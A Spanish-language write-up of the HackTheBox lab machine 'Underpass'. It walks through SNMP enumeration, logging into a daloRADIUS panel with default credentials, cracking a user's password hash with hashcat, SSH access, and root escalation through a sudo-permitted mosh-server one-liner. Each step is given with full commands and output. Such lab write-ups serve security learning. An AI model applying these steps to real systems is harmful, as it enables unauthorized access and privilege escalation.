---
title: "Máquina Underpass"
description: "Resolución de la máquina Underpass de HackTheBox"
tags: ["SNMP", "daloRADIUS", "mosh"]
categories: ["HackTheBox", "Easy", "Linux"]
logo: "/assets/writeups/underpass/logo.webp"
---

Un servidor tiene un servicio SNMP expuesto que expone información de su servidor web Apache con una aplicación vulnerable. Abusaremos de esta y escalaremos privilegios abusando de un permiso sudoers.

## Reconocimiento

La máquina tiene dos puertos abiertos

```bash
# Nmap 7.95 scan initiated Sat Dec 21 15:01:05 2024 as: nmap -sS -Pn -p- --open -oN ports --min-rate 300 -vvv 10.129.41.19
Nmap scan report for 10.129.41.19
Host is up, received user-set (0.32s latency).
Scanned at 2024-12-21 15:01:05 -04 for 175s
Not shown: 61938 closed tcp ports (reset), 3595 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Dec 21 15:04:00 2024 -- 1 IP address (1 host up) scanned in 175.13 seconds
```

El servidor web se ve bastante desolado.

![Apache default page](/assets/writeups/underpass/1.png)

Por el puerto SSH no hay nada tampoco, sin embargo si escaneamos por UDP encontraremos el puerto SNMP abierto:

```bash
❯ nmap -sU -p 161 -vvv -n --min-rate 300 10.10.11.48
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 10:35 -04
Initiating Ping Scan at 10:35
Scanning 10.10.11.48 [4 ports]
Completed Ping Scan at 10:35, 0.09s elapsed (1 total hosts)
Initiating UDP Scan at 10:35
Scanning 10.10.11.48 [1 port]
Discovered open port 161/udp on 10.10.11.48
Completed UDP Scan at 10:35, 0.23s elapsed (1 total ports)
Nmap scan report for 10.10.11.48
Host is up, received echo-reply ttl 63 (0.083s latency).
Scanned at 2025-05-09 10:35:50 -04 for 0s

PORT    STATE SERVICE REASON
161/udp open  snmp    udp-response ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
           Raw packets sent: 6 (319B) | Rcvd: 2 (156B)
```

Con `snmpwalk` podremos ver el contenido del servicio. La única comunidad que parece existir es la típica `public` y nos da algo de información útil sobre la máquina:

```bash
❯ snmpwalk -v 2c -c public 10.10.11.48
SNMPv2-MIB::sysDescr.0 = STRING: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (634390) 1:45:43.90
SNMPv2-MIB::sysContact.0 = STRING: steve@underpass.htb
SNMPv2-MIB::sysName.0 = STRING: UnDerPass.htb is the only daloradius server in the basin!
SNMPv2-MIB::sysLocation.0 = STRING: Nevada, U.S.A. but not Vegas
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (4) 0:00:00.04
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
... [snip]
```

Lo único que tiene de interesante es la línea "UnDerPass.htb is the only daloradius server in the basin!". [Daloradius](https://www.daloradius.com/) es un software para el manejo sencillo de servicios FreeRADIUS (Protocolo Remote Authentication Dial In User Service). Si de casualidad nos da por ver si existe una carpeta llamada `daloradius` en el servidor Apache que vimos antes veremos que:

```bash
❯ curl -v http://10.10.11.48/daloradius
*   Trying 10.10.11.48:80...
* Connected to 10.10.11.48 (10.10.11.48) port 80
* using HTTP/1.x
> GET /daloradius HTTP/1.1
> Host: 10.10.11.48
> User-Agent: curl/8.12.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 301 Moved Permanently
< Date: Fri, 09 May 2025 14:40:48 GMT
< Server: Apache/2.4.52 (Ubuntu)
< Location: http://10.10.11.48/daloradius/
< Content-Length: 315
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://10.10.11.48/daloradius/">here</a>.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at 10.10.11.48 Port 80</address>
</body></html>
* Connection #0 to host 10.10.11.48 left intact
```

¡Existe! y si buscamos en el código fuente de dicha aplicación veremos que en la ruta `app/users/login.php` está el panel de inicio de sesión para usuarios:

![Login](/assets/writeups/underpass/2.png)

Veamos que hacemos por acá.

## Intrusión

El par de credenciales por defecto (administrator:radius) sirve en el panel de operadores ubicado en `app/operators/login.php`. Parece que no tiene mucha configuración.

![Panel](/assets/writeups/underpass/3.png)

En `Management -> Users -> List users` veremos un usuario llamado `svcMosh` y un hash que parece ser el de su contraseña.

![Mosh user](/assets/writeups/underpass/4.png)

La contraseña es débil:

```bash
❯ hashcat -m 900 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --show
412dd4759978acfcc81deab01b382403:underwaterfriends
```

y sirve para acceder por ssh:

```bash
❯ /usr/bin/ssh svcMosh@10.10.11.48
svcMosh@10.10.11.48 password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

... [snip]

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jan 11 13:29:47 2025 from 10.10.14.62
svcMosh@underpass:~$ 
```

En el directorio personal de este usuario encontraremos la primera flag.

```bash
svcMosh@underpass:~$ ls -la
total 36
drwxr-x--- 5 svcMosh svcMosh 4096 Jan 11 13:29 .
drwxr-xr-x 3 root    root    4096 Dec 11 16:06 ..
lrwxrwxrwx 1 root    root       9 Sep 22  2024 .bash_history -> /dev/null
-rw-r--r-- 1 svcMosh svcMosh  220 Sep  7  2024 .bash_logout
-rw-r--r-- 1 svcMosh svcMosh 3771 Sep  7  2024 .bashrc
drwx------ 2 svcMosh svcMosh 4096 Dec 11 16:06 .cache
drwxrwxr-x 3 svcMosh svcMosh 4096 Jan 11 13:29 .local
-rw-r--r-- 1 svcMosh svcMosh  807 Sep  7  2024 .profile
drwxr-xr-x 2 svcMosh svcMosh 4096 Dec 11 16:06 .ssh
-rw-r----- 1 root    svcMosh   33 May  9 12:52 user.txt
svcMosh@underpass:~$ cat user.txt
f414bb76a7fe538617fc0a6cfa******
```

## Escalada de privilegios

Podemos correr `mosh-server` como cualquier usuario:

```bash
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

Viendo el help del comando y buscando por internet que es lo que hace, ya nos pone los ojitos con estrellas:

```bash
svcMosh@underpass:~$ /usr/bin/mosh-server --help
Usage: /usr/bin/mosh-server new [-s] [-v] [-i LOCALADDR] [-p PORT[:PORT2]] [-c COLORS] [-l NAME=VALUE] [-- COMMAND...]
```

Parece que podemos crear un servidor mosh que se ejecute como root. Esto significa que al hacerlo y conectarnos a él técnicamente tendríamos privilegios de root.

Esto es sencillo de hacer. Simplemente vamos a utilizar el cliente de mosh que ya está instalado en la máquina y decirle que use el sudo para ejecutar el servidor de mosh cuando se conecte por SSH:

```bash
svcMosh@underpass:~$ mosh --server="sudo /usr/bin/mosh-server new -i 127.0.0.1" 127.0.0.1
```

Al hacerlo ya estaremos en una consola como root:

```bash
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri May  9 04:17:56 PM UTC 2025
... [snip]
root@underpass:~#
```

Con esto ya podemos tomar la última flag.

```bash
root@underpass:~# ls -la
total 44
drwx------  6 root root 4096 May  9 15:06 .
drwxr-xr-x 18 root root 4096 Dec 11 16:06 ..
lrwxrwxrwx  1 root root    9 Nov 30 10:39 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Sep 22  2024 .cache
drwx------  3 root root 4096 Dec 11 13:40 .config
-rw-------  1 root root   20 Dec 19 12:42 .lesshst
drwxr-xr-x  3 root root 4096 Dec 11 16:06 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 May  9 15:06 root.txt
drwx------  2 root root 4096 Dec 11 16:06 .ssh
-rw-r--r--  1 root root  165 Dec 11 16:38 .wget-hsts
root@underpass:~# cat root.txt
39d1d3aec14fb343ec51052507******
```

## Extra

Esta es una de las primeras máquinas de dificultad fácil en la que el acesso inicial no es tan evidente. Me gustó mucho esa parte del SNMP y el servidor Apache ya que da las vibras de que estás contra un servidor random que te encontraste en internet.